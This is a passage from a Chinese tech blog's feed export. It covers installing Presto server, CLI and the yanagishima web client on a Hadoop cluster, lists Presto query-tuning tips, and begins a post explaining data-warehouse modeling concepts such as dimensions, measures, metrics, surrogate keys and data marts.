title="https://prestodb.io/getting-started.html">https://prestodb.io/getting-started.html</a></p></blockquote><h3 id="2-1-Presto-Server安装">2.1 Presto Server安装</h3><blockquote><p>各版本下载：<a href="https://repo1.maven.org/maven2/com/facebook/presto/presto-server/" target="_blank" rel="noopener" title="https://repo1.maven.org/maven2/com/facebook/presto/presto-server/">https://repo1.maven.org/maven2/com/facebook/presto/presto-server/</a></p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># https://prestodb.io/docs/current/installation/deployment.html</span></span><br><span class="line"><span class="built_in">cd</span> /opt/software</span><br><span class="line">wget https://repo1.maven.org/maven2/com/facebook/presto/presto-server/0.196/presto-server-0.196.tar.gz</span><br><span class="line"></span><br><span class="line">tar -zxvf presto-server-0.196.tar.gz -C /opt/module/</span><br><span class="line">mv presto-server-0.196/ presto</span><br><span class="line"><span class="comment"># 进入到/opt/module/presto目录，并创建存储数据文件夹</span></span><br><span class="line"><span class="built_in">cd</span> presto</span><br><span class="line">mkdir data</span><br><span class="line"><span class="comment"># 存储配置文件文件夹</span></span><br><span class="line">mkdir etc</span><br><span class="line"><span class="comment"># 配置在/opt/module/presto/etc目录下添加jvm.config配置文件</span></span><br><span class="line">vim etc/jvm.config</span><br><span class="line"><span class="comment"># 添加如下内容</span></span><br><span class="line">-server</span><br><span class="line">-Xmx16G</span><br><span class="line">-XX:+UseG1GC</span><br><span class="line">-XX:G1HeapRegionSize=32M</span><br><span class="line">-XX:+UseGCOverheadLimit</span><br><span class="line">-XX:+ExplicitGCInvokesConcurrent</span><br><span class="line">-XX:+HeapDumpOnOutOfMemoryError</span><br><span class="line">-XX:+ExitOnOutOfMemoryError</span><br><span class="line"></span><br><span class="line"><span class="comment"># Presto可以支持多个数据源，在Presto里面叫catalog，这里我们配置支持Hive的数据源，配置一个Hive的catalog</span></span><br><span class="line">mkdir etc/catalog</span><br><span class="line">vim etc/catalog/hive.properties </span><br><span class="line"><span class="comment"># 添加如下内容</span></span><br><span class="line">connector.name=hive-hadoop2</span><br><span class="line">hive.metastore.uri=thrift://hadoop102:9083</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将hadoop102上的presto分发到hadoop103、hadoop104</span></span><br><span class="line">xsync presto</span><br><span class="line"><span class="comment"># 分发之后，分别进入hadoop102、hadoop103、hadoop104三台主机的/opt/module/presto/etc的路径。配置node属性，node id每个节点都不一样</span></span><br><span class="line">[atguigu@hadoop102 etc]<span class="variable">$vim</span> node.properties</span><br><span class="line">node.environment=production</span><br><span class="line">node.id=ffffffff-ffff-ffff-ffff-ffffffffffff</span><br><span class="line">node.data-dir=/opt/module/presto/data</span><br><span class="line"></span><br><span class="line">[atguigu@hadoop103 etc]<span class="variable">$vim</span> node.properties</span><br><span class="line">node.environment=production</span><br><span class="line">node.id=ffffffff-ffff-ffff-ffff-fffffffffffe</span><br><span class="line">node.data-dir=/opt/module/presto/data</span><br><span class="line"></span><br><span class="line">[atguigu@hadoop104 etc]<span class="variable">$vim</span> node.properties</span><br><span class="line">node.environment=production</span><br><span class="line">node.id=ffffffff-ffff-ffff-ffff-fffffffffffd</span><br><span class="line">node.data-dir=/opt/module/presto/data</span><br><span class="line"></span><br><span class="line"><span class="comment"># Presto是由一个coordinator节点和多个worker节点组成。在hadoop102上配置成coordinator，在hadoop103、hadoop104上配置为worker</span></span><br><span class="line">vim etc/config.properties</span><br><span class="line"><span class="comment"># 添加内容如下</span></span><br><span class="line">coordinator=<span class="literal">true</span></span><br><span class="line">node-scheduler.include-coordinator=<span class="literal">false</span></span><br><span class="line">http-server.http.port=8881</span><br><span class="line">query.max-memory=50GB</span><br><span class="line">discovery-server.enabled=<span class="literal">true</span></span><br><span class="line">discovery.uri=http://hadoop102:8881</span><br><span class="line"></span><br><span class="line"><span class="comment"># hadoop103、hadoop104上配置worker节点</span></span><br><span class="line">coordinator=<span class="literal">false</span></span><br><span class="line">http-server.http.port=8881</span><br><span class="line">query.max-memory=50GB</span><br><span class="line">discovery.uri=http://hadoop102:8881</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在hadoop102的/opt/module/hive目录下，启动Hive Metastore，用atguigu角色</span></span><br><span class="line">nohup bin/hive --service metastore &gt;/dev/null 2&gt;&amp;1 &amp;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 分别在hadoop102、hadoop103、hadoop104上启动Presto Server,三台机器依次启动</span></span><br><span class="line"><span class="comment"># 前台启动Presto，控制台显示日志</span></span><br><span class="line">bin/launcher run</span><br><span class="line"><span class="comment"># 后台启动Presto</span></span><br><span class="line">bin/launcher start</span><br><span class="line"><span class="comment"># 日志查看路径/opt/module/presto/data/var/log</span></span><br></pre></td></tr></table></figure><h3 id="2-2-Presto命令行Client安装">2.2 Presto命令行Client安装</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下载Presto的客户端</span></span><br><span class="line">wget https://repo1.maven.org/maven2/com/facebook/presto/presto-cli/0.196/presto-cli-0.196-executable.jar</span><br><span class="line"><span class="comment"># 修改文件名称</span></span><br><span class="line">mv presto-cli-0.196-executable.jar  prestocli</span><br><span class="line">chmod +x prestocli</span><br><span class="line"><span class="comment"># 启动prestocli</span></span><br><span class="line">./prestocli --server hadoop102:8881 --catalog hive --schema default</span><br><span class="line"><span class="comment"># Presto命令行操作</span></span><br><span class="line"><span class="comment"># Presto的命令行操作，相当于Hive命令行操作。每个表必须要加上schema</span></span><br><span class="line">select * from schema.table <span class="built_in">limit</span> 100;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果发现因为压缩例如lzo问题无法查询，可以将hadoop的压缩jar包复制到plugins中的特定连接器中</span></span><br><span class="line"><span class="comment"># /opt/module/hadoop-3.1.3/share/hadoop/common/</span></span><br><span class="line"><span class="comment"># 最后重启即可</span></span><br></pre></td></tr></table></figure><h3 id="2-3-Presto可视化Client安装">2.3 Presto可视化Client安装</h3><blockquote><p>官网：<a href="https://github.com/yanagishima/yanagishima" target="_blank" rel="noopener" title="https://github.com/yanagishima/yanagishima">https://github.com/yanagishima/yanagishima</a></p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 已编译包获取：https://download.csdn.net/download/lemon_TT/87951242</span></span><br><span class="line"><span class="comment"># 自行编译可以参考：https://blog.csdn.net/cz124560/article/details/128316460</span></span><br><span class="line"><span class="comment"># 将yanagishima-18.0.zip上传到hadoop102的/opt/module目录</span></span><br><span class="line">unzip yanagishima-18.0.zip</span><br><span class="line"><span class="built_in">cd</span> yanagishima-18.0</span><br><span class="line"><span class="comment"># 进入到/opt/module/yanagishima-18.0/conf文件夹，编写yanagishima.properties配置</span></span><br><span class="line"><span class="comment"># 添加如下内容</span></span><br><span class="line">jetty.port=7080</span><br><span class="line">presto.datasources=atguigu-presto</span><br><span class="line">presto.coordinator.server.atguigu-presto=http://hadoop102:8881</span><br><span class="line">catalog.atguigu-presto=hive</span><br><span class="line">schema.atguigu-presto=default</span><br><span class="line">sql.query.engines=presto</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在/opt/module/yanagishima-18.0路径下启动yanagishima</span></span><br><span class="line">nohup bin/yanagishima-start.sh &gt;y.log 2&gt;&amp;1 &amp;</span><br><span class="line"><span class="comment"># 启动web页面  http://hadoop102:7080  ,注意不联网可能就是空白的</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看表结构</span></span><br><span class="line"><span class="comment"># 这里有个Tree View，可以查看所有表的结构，包括Schema、表、字段等。</span></span><br><span class="line"><span class="comment"># 比如执行select * from hive.dw_weather.tmp_news_click limit 10，这个句子里Hive这个词可以删掉，是上面配置的Catalog</span></span><br></pre></td></tr></table></figure><h2 id="3、Presto优化之数据存储">3、Presto优化之数据存储</h2><h3 id="3-1-合理设置分区">3.1 合理设置分区</h3><p>与Hive类似，Presto会根据元数据信息读取分区数据，合理的分区能减少Presto数据读取量，提升查询性能</p><h3 id="3-2-使用列式存储">3.2 使用列式存储</h3><p>Presto对ORC文件读取做了特定优化，因此在Hive中创建Presto使用的表时，建议采用ORC格式存储。相对于Parquet，Presto对ORC支持更好</p><h3 id="3-3-使用压缩">3.3 使用压缩</h3><p>数据压缩可以减少节点间数据传输对IO带宽压力，对于即席查询需要快速解压，建议采用Snappy压缩</p><h2 id="4、Presto优化之查询SQL">4、Presto优化之查询SQL</h2><h3 id="4-1-只选择使用的字段">4.1 只选择使用的字段</h3><p>由于采用列式存储，选择需要的字段可加快字段的读取、减少数据量。避免采用*读取所有字段</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[GOOD]: <span class="keyword">SELECT</span> <span class="built_in">time</span>, <span class="keyword">user</span>, host <span class="keyword">FROM</span> tbl</span><br><span class="line">[BAD]:  <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> tbl</span><br></pre></td></tr></table></figure><h3 id="4-2-过滤条件必须加上分区字段">4.2 过滤条件必须加上分区字段</h3><p>对于有分区的表，where语句中优先使用分区字段进行过滤。acct_day是分区字段，visit_time是具体访问时间</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[GOOD]: <span class="keyword">SELECT</span> <span class="built_in">time</span>, <span class="keyword">user</span>, host <span class="keyword">FROM</span> tbl <span class="keyword">where</span> acct_day=<span class="number">20171101</span></span><br><span class="line">[BAD]:  <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> tbl <span class="keyword">where</span> visit_time=<span class="number">20171101</span></span><br></pre></td></tr></table></figure><h3 id="4-3-Group-By语句优化">4.3 Group By语句优化</h3><p>合理安排Group by语句中字段顺序对性能有一定提升。将Group By语句中字段按照每个字段distinct数据多少进行降序排列</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[GOOD]: <span class="keyword">SELECT</span> <span class="keyword">GROUP</span> <span class="keyword">BY</span> uid, gender</span><br><span class="line">[BAD]:  <span class="keyword">SELECT</span> <span class="keyword">GROUP</span> <span class="keyword">BY</span> gender, uid</span><br></pre></td></tr></table></figure><h3 id="4-4-Order-by时使用Limit">4.4 Order by时使用Limit</h3><p>Order by需要扫描数据到单个worker节点进行排序，导致单个worker需要大量内存。如果是查询Top N或者Bottom N，使用limit可减少排序计算和内存压力。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[GOOD]: <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> tbl <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="built_in">time</span> <span class="keyword">LIMIT</span> <span class="number">100</span></span><br><span class="line">[BAD]:  <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> tbl <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="built_in">time</span></span><br></pre></td></tr></table></figure><h3 id="4-5-使用Join语句时将大表放在左边">4.5 使用Join语句时将大表放在左边</h3><p>Presto中join的默认算法是broadcast join，即将join左边的表分割到多个worker，然后将join右边的表数据整个复制一份发送到每个worker进行计算。如果右边的表数据量太大，则可能会报内存溢出错误</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[GOOD] <span class="keyword">SELECT</span> ... <span class="keyword">FROM</span> large_table l <span class="keyword">join</span> small_table s <span class="keyword">on</span> l.id = s.id</span><br><span class="line">[BAD] <span class="keyword">SELECT</span> ... <span class="keyword">FROM</span> small_table s <span class="keyword">join</span> large_table l <span class="keyword">on</span> l.id = s.id</span><br></pre></td></tr></table></figure><h2 id="5、注意事项">5、注意事项</h2><h3 id="5-1-字段名引用">5.1 字段名引用</h3><p>避免和关键字冲突：MySQL对字段加反引号、Presto对字段加双引号分割，当然，如果字段名称不是关键字，可以不加这个双引号。</p><h3 id="5-2-时间函数">5.2 时间函数</h3><p>对于Timestamp，需要进行比较的时候，需要添加Timestamp关键字，而MySQL中对Timestamp可以直接进行比较。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*MySQL的写法*/</span></span><br><span class="line"><span class="keyword">SELECT</span> t <span class="keyword">FROM</span> a <span class="keyword">WHERE</span> t &gt; <span class="string">'2017-01-01 00:00:00'</span>; </span><br><span class="line"><span class="comment">/*Presto中的写法*/</span></span><br><span class="line"><span class="keyword">SELECT</span> t <span class="keyword">FROM</span> a <span class="keyword">WHERE</span> t &gt; <span class="built_in">timestamp</span> <span class="string">'2017-01-01 00:00:00'</span>;</span><br></pre></td></tr></table></figure><h3 id="5-3-不支持INSERT-OVERWRITE语法">5.3 不支持INSERT OVERWRITE语法</h3><p>Presto中不支持insert overwrite语法，只能先delete，然后insert into</p><h3 id="5-4-PARQUET格式">5.4 PARQUET格式</h3><p>Presto目前支持Parquet格式，支持查询，但不支持insert</p>]]></content>
    
    
    <summary type="html">&lt;h1&gt;即席查询&lt;/h1&gt;
&lt;h1&gt;一、Kylin4.x&lt;/h1&gt;
&lt;h2 id=&quot;1、Kylin概述&quot;&gt;1、Kylin概述&lt;/h2&gt;
&lt;h3 id=&quot;1-1-定义&quot;&gt;1.1 定义&lt;/h3&gt;
&lt;p&gt;Apache Kylin 是一个开源的分布式分析引擎，提供 Hadoop/Spark 之上的 SQL 查询接口及多维分析（OLAP）能力以支持超大规模数据，最初由 eBay Inc 开发并贡献至开源社区。它能在亚秒内查询巨大的 Hive 表。&lt;/p&gt;</summary>
    
    
    
    <category term="大数据" scheme="https://blog.shawncoding.top/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE/"/>
    
    
    <category term="大数据" scheme="https://blog.shawncoding.top/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE/"/>
    
  </entry>
  
  <entry>
    <title>大数据建模理论</title>
    <link href="https://blog.shawncoding.top/posts/5e209423.html"/>
    <id>https://blog.shawncoding.top/posts/5e209423.html</id>
    <published>2024-05-31T08:23:09.000Z</published>
    <updated>2024-05-31T08:34:58.092Z</updated>
    
    <content type="html"><![CDATA[<h1>一、数仓概述</h1><h2 id="1、数据仓库概念">1、数据仓库概念</h2><h3 id="1-1-概述">1.1 概述</h3><p>通常数据仓库的数据来自各个业务应用系统。业务系统中的数据形式多种多样，可能是 Oracle、MySQL、SQL Server等关系数据库里的结构化数据，可能是文本、CSV等平面文件或Word、Excel文档中的数据，还可能是HTML、XML等自描述的半结构化数据。这些业务数据经过一系列的数据抽取、转换、清洗，最终以一种统一的格式装载进数据仓库。数据仓库里的数据作为分析用的数据源，提供给后面的即席查询、 分析系统、数据集市、报表系统、数据挖掘系统等。</p><a id="more"></a><h3 id="1-2-数据仓库与数据库的区别">1.2 数据仓库与数据库的区别</h3><ul><li>数据仓库在设计是有意引入冗余，依照分析需求，分析维度、分析指标进行设计</li><li>数据库是为捕获数据而设计，数据仓库是为分析数据而设计</li></ul><p><strong>数据仓库，是在数据库已经大量存在的情况下，为了进一步挖掘数据资源、为了决策需要而产生的，它决不是所谓的&quot;大型数据库</strong>&quot;</p><h3 id="1-3-技术选型和架构">1.3 技术选型和架构</h3><p><img src="http://qnypic.shawncoding.top/blog/202404151823416.png" alt></p><p>离线和实时数仓一般架构</p><p><img src="http://qnypic.shawncoding.top/blog/202404151823417.png" alt></p><h2 id="2、数仓常见名词">2、数仓常见名词</h2><h3 id="2-1-实体">2.1 实体</h3><p>实体是指依附的主体，就是我们分析的一个对象，比如我们分析商品的销售情况，如华为手机近半年的销售量是多少，那华为手机就是一个实体；我们分析用户的活跃度，用户就是一个实体。当然实体也可以现实中不存在的，比如虚拟的业务对象，活动，会员等都可看做一个实体。</p><p><strong>实体的存在是为了业务分析，作为分析的一个筛选的维度，拥有描述自己的属性，本身具有可分析的价值</strong></p><h3 id="2-2-维度">2.2 维度</h3><p>维度就是看待问题的角度，分析业务数据，从什么角度分析，就建立什么样的维度。所以维度就是要对数据进行分析时所用的一个量，比如你要分析产品销售情况，你可以选择按商品类别来进行分析，这就构成一个维度，把所有商品类别集合在一起，就构成了维度表</p><h3 id="2-3-度量">2.3 度量</h3><p>度量是业务流程节点上的一个数值。比如销量，价格，成本等等。<strong>事实表中的度量可分为三类：完全可加，半可加，不可加</strong>。</p><ul><li>完全可加的度量是最灵活，最有用的，比如说销量，销售额等，可进行任意维度汇总；</li><li>半可加的度量可以对某些维度汇总，但不能对所有维度汇总，差额是常见的半可加度量，它除了时间维度外，可以跨所有维度进行加法操作；</li><li>还有一种是完全不可加的，例如：比率。对于这类非可加度量，一种好的方法是，<strong>尽可能存储非可加度量的完全可加分量</strong>，并在计算出最终的非可加事实前，将这些分量汇总到最终的结果集中。</li></ul><h3 id="2-4-粒度">2.4 粒度</h3><p>粒度就是业务流程中对度量的单位，比如商品是按件记录度量，还是按批记录度量。在数仓建设中，我们说这是用户粒度的事实表，那么表中每行数据都是一个用户，无重复用户；例如还有销售粒度的表，那么表中每行都是一条销售记录。</p><p><strong>选择合适的粒度级别是数据仓库建设好坏的重要关键内容</strong>，在设计数据粒度时，通常需重点考虑以下因素：</p><ul><li>要接受的分析类型、可接受的数据最低粒度和能存储的数据量；</li><li>粒度的层次定义越高，就越不能在该仓库中进行更细致的分析；</li><li>如果存储资源有一定的限制，就只能采用较高的数据粒度划分；</li><li><strong>数据粒度划分策略一定要保证：数据的粒度确实能够满足用户的决策分析需要，这是数据粒度划分策略中最重要的一个准则</strong>。</li></ul><h3 id="2-5-口径">2.5 口径</h3><p><strong>口径就是取数逻辑（如何取数的）</strong>，比如<strong>要取的数</strong>是10岁以下儿童中男孩的平均身高，这就是统计的口径。</p><h3 id="2-6-指标">2.6 指标</h3><p><strong>指标是口径的衡量值，也就是最后的结果</strong>。比如最近七天的订单量，一个促销活动的购买转化率等。一个指标具体到计算实施，主要有以下几部分组成：</p><ul><li>指标加工逻辑，比如count ,sum, avg</li><li>维度，比如按部门、地域进行指标统计，对应sql中的group by</li><li>业务限定/修饰词，比如以不同的支付渠道来算对应的指标，微信支付的订单退款率，支付宝支付的订单退款率 。对应sql中的where。</li></ul><p>除此之外，指标本身还可以衍生、派生出更多的指标，基于这些特点，可以将指标进行分类：</p><ul><li><p><strong>原子指标</strong>：基本业务事实，没有业务限定、没有维度。比如订单表中的订单量、订单总金额都算原子指标；</p><p>业务方更关心的指标，是有实际业务含义，可以直接取数据的指标。比如店铺近1天订单支付金额就是一个派生指标，会被直接在产品上展示给商家看。  但是这个指标却不能直接从数仓的统一中间层里取数（因为没有现成的事实字段，数仓提供的一般都是大宽表）。需要有一个桥梁连接数仓中间层和业务方的指标需求，于是便有了派生指标</p></li><li><p><strong>派生指标</strong>：<em>维度+修饰词+原子指标</em>。 店铺近1天订单支付金额中店铺是维度，近1天是一个时间类型的修饰词，支付金额是一个原子指标；</p><p>维度：观察各项指标的角度；  修饰词：维度的一个或某些值，比如维度性别下，男和女就是2种修饰词。</p></li><li><p><strong>衍生指标</strong>：比如某一个促销活动的转化率就是衍生指标，因为需要<strong>促销投放人数指标</strong>和促销订单数指标进行计算得出</p></li></ul><h3 id="2-7-标签">2.7 标签</h3><p>标签是人为设定的、根据业务场景需求，对目标对象运用一定的算法得到的高度精炼的特征标识。可见标签是经过人为再加工后的结果，如网红、白富美、萝莉。对于有歧义的标签，我们内部可进行标签区分，比如：苹果，我们可以定义苹果指的是水果，苹果手机才指的是手机</p><h3 id="2-8-自然键-持久键-代理键">2.8 自然键/持久键/代理键</h3><ul><li><strong>自然键</strong>：由现实中已经存在的属性组成的键，它在业务概念中是唯一的，并具有一定的业务含义，比如商品ID，员工ID。以数仓角度看，来自于业务系统的标识符就是自然键，比如业务库中员工的编号</li><li><strong>持久键</strong>：保持永久性不会发生变化。有时也被叫做超自然持久键。比如身份证号属于持久键</li></ul><p><strong>自然键和持久键区别</strong>：比如说公司员工离职之后又重新入职，他的自然键也就是员工编号发生了变化，但是他的持久键身份证号是不变的。</p><ul><li><strong>代理键</strong>：就是不具有业务含义的键。代理键有许多其他的称呼：无意义键、整数键、非自然键、人工键、合成键等。代理键就是简单的以按照顺序序列生产的整数表示。产品行的第1行代理键为1，则下一行的代理键为2，如此进行。<strong>代理键的作用仅仅是连接维度表和事实表</strong>。</li></ul><h3 id="2-9-退化维度">2.9 退化维度</h3><p><strong>退化维度，就是那些看起来像是事实表的一个维度关键字，但实际上并没有对应的维度表</strong>，就是维度属性存储到事实表中，这种存储到事实表中的维度列被称为退化维度。与其他存储在维表中的维度一样，退化维度也可以用来进行事实表的过滤查询、实现聚合操作等。</p><p>那么究竟怎么定义退化维度呢？比如说订单id，这种量级很大的维度，没必要用一张维度表来进行存储，而我们进行数据查询或者数据过滤的时候又非常需要，所以这种就冗余在事实表里面，这种就叫退化维度，citycode这种我们也会冗余在事实表里面，但是<strong>它有对应的维度表，所以它不是退化维度</strong></p><h3 id="2-10-下钻-上卷">2.10 下钻/上卷</h3><p><strong>下钻</strong>：这是在数据分析中常见的概念，下钻可以理解成增加维的层次，从而可以<strong>由粗粒度到细粒度来观察数据</strong>，比如对产品销售情况分析时，可以沿着时间维从年到月到日更细粒度的观察数据。从年的维度可以下钻到月的维度、日的维度等</p><p>知道了下钻，上卷就容易理解了，它俩是相逆的操作，所以上卷可以理解为删掉维的某些层，由细粒度到粗粒度观察数据的操作或沿着维的层次向上聚合汇总数据。</p><h3 id="2-11-数据集市">2.11 数据集市</h3><p>数据集市（Data Mart），也叫数据市场，数据集市就是满足特定的部门或者用户的需求，按照多维的方式进行存储，包括定义维度、需要计算的指标、维度的层次等，生成面向决策分析需求的数据立方体。其实就是从数据仓库中抽取出来的一个小合集。</p><h2 id="3、数仓名词之间关系">3、数仓名词之间关系</h2><h3 id="3-1-实体表，事实表，维度表之间的关系">3.1 实体表，事实表，维度表之间的关系</h3><ul><li><strong>维度表</strong>：维度表可以看成是用户用来分析一个事实的窗口，它里面的数据应该是对事实的各个方面描述，比如时间维度表，地域维度表，维度表是事实表的一个分析角度</li><li><strong>事实表</strong>：事实表其实就是通过各种维度和一些指标值的组合来确定一个事实的，比如通过时间维度，地域组织维度，指标值可以去确定在某时某地的一些指标值怎么样的事实。事实表的每一条数据都是几条维度表的数据和指标值交汇而得到的。</li><li><strong>实体表</strong>：实体表就是一个实际对象的表，实体表放的数据一定是一条条客观存在的事物数据，比如说各种商品，它就是客观存在的，所以可以将其设计一个实体表。实时表只描述各个事物，并不存在具体的事实，所以也有人称实体表是无事实的事实表。</li></ul><p>举个例子：比如说手机商场中有苹果手机，华为手机等各品牌各型号的手机，这些数据可以组成一个<strong>手机实体表</strong>，但是表中没有可度量的数据。某天苹果手机卖了15台，华为手机卖了20台，这些手机销售数据属于事实，组成一个<strong>事实表</strong>。这样就可以使用<strong>日期维度表</strong>和<strong>地域维度表</strong>对这个事实表进行各种维度分析。</p><h3 id="3-2-指标与标签的区别">3.2 指标与标签的区别</h3><ul><li><strong>概念不同</strong></li></ul><p><strong>指标</strong>是用来定义、评价和描述特定事物的一种标准或方式。比如：新增用户数、累计用户数、用户活跃率等是衡量用户发展情况的指标；</p><p><strong>标签</strong>是人为设定的、根据业务场景需求，对目标对象运用一定的算法得到的高度精炼的特征标识。可见标签是经过人为再加工后的结果，如网红、白富美、萝莉。</p><ul><li><strong>构成不同</strong></li></ul><p><strong>指标名称</strong>是对事物质与量两方面特点的命名；指标取值是指标在具体时间、地域、条件下的数量表现，如人的体重，指标名称是体重，指标的取值就是120斤；</p><p><strong>标签名称</strong>通常都是形容词或形容词+名词的结构，标签一般是不可量化的，通常是孤立的，除了基础类标签，通过一定算法加工出来的标签一般都没有单位和量纲。如将超过200斤的称为大胖子。</p><ul><li><strong>分类不同</strong></li></ul><p><strong>对指标的分类</strong>：按照指标计算逻辑，可以将指标分为原子指标、派生指标、衍生指标三种类型；按照对事件描述内容的不同，分为过程性指标和结果性指标；</p><p><strong>对标签的分类</strong>：按照标签的变化性分为静态标签和动态标签；按照标签的指代和评估指标的不同，可分为定性标签和定量标签；</p><p><strong>指标</strong>最擅长的应用是监测、分析、评价和建模。<strong>标签</strong>最擅长的应用是标注、刻画、分类和特征提取。特别需要指出的是，由于对结果的标注也是一种标签，所以在自然语言处理和机器学习相关的算法应用场景下，标签对于监督式学习有重要价值，只是单纯的指标难以做到的。而指标在任务分配、绩效管理等领域的作用，也是标签无法做到的。</p><h3 id="3-3-维度和指标区别与联系">3.3 维度和指标区别与联系</h3><p><strong>维度就是数据的观察角度，即从哪个角度去分析问题，看待问题。指标就是从维度的基础上去衡算这个结果的值。</strong></p><p>维度一般是一个离散的值，比如时间维度上每一个独立的日期或地域，因此统计时，可以把维度相同记录的聚合在一起，应用聚合函数做累加、均值、最大值、最小值等聚合计算。指标就是被聚合的通计算，即聚合运算的结果，一般是一个连续的值</p><h3 id="3-4-自然键与代理键在数仓的使用区别">3.4 自然键与代理键在数仓的使用区别</h3><p>数仓工具箱中说<strong>维度表的唯一主键应该是代理键而不应该是自然键</strong>。有时建模人员不愿意放弃使用自然键，因为他们希望与操作型代码查询事实表，而不希望与维度表做连接操作。然而，应该避免使用包含业务含义的多维键，因为不管我们做出任何假设最终都可能变得无效，因为我们控制不了业务库的变动。</p><p><strong>所以数据仓库中维度表与事实表的每个连接应该基于无实际含义的整数代理键。避免使用自然键作为维度表的主键</strong>。</p><h3 id="3-5-数据集市和数据仓库的关系">3.5 数据集市和数据仓库的关系</h3><p><strong>数据集市是企业级数据仓库的一个子集</strong>，他主要面向部门级业务，并且只面向某个特定的主题。为了解决灵活性和性能之间的矛盾，数据集市就是数据仓库体系结构中增加的一种小型的部门或工作组级别的数据仓库。数据集市存储为特定用户预先计算好的数据，从而满足用户对性能的需求。数据集市可以在一定程度上缓解访问数据仓库的瓶颈。</p><p><strong>数据集市和数据仓库的主要区别</strong>：数据仓库是企业级的，能为整个企业各个部门的运行提供决策支持手段；而数据集市则是一种微型的数据仓库,它通常有更少的数据,更少的主题区域,以及更少的历史数据,因此是部门级的，一般只能为某个局部范围内的管理人员服务，因此也称之为部门级数据仓库。</p><h1>二、离线数仓相关核心概念</h1><h2 id="1、数据仓库分层">1、数据仓库分层</h2><h3 id="1-1-概述与原则">1.1 概述与原则</h3><ul><li>为便于数据分析，要屏蔽底层复杂业务，简单、完整、集成的将数据暴露给分析层</li><li>底层业务变动与上层需求变动对模型冲击最小化，业务系统变化影响削弱在基础数据层，结合自上而下的建设方法削弱需求变动对模型的影响</li><li>高内聚松耦合，即主题之内或各个完整意义的系统内数据的高内聚，主题之间或各个完整意义的系统间数据的松耦合</li><li>构建仓库基础数据层，使底层业务数据整合工作与上层应用开发工作相隔离，为仓库大规模开发奠定基础 仓库层次更加清晰，对外暴露数据更加统一</li></ul><p><img src="http://qnypic.shawncoding.top/blog/202404151823418.png" alt></p><h3 id="1-2-数据源层：ODS（Operational-Data-Store）">1.2 数据源层：ODS（Operational Data Store）</h3><p>ODS 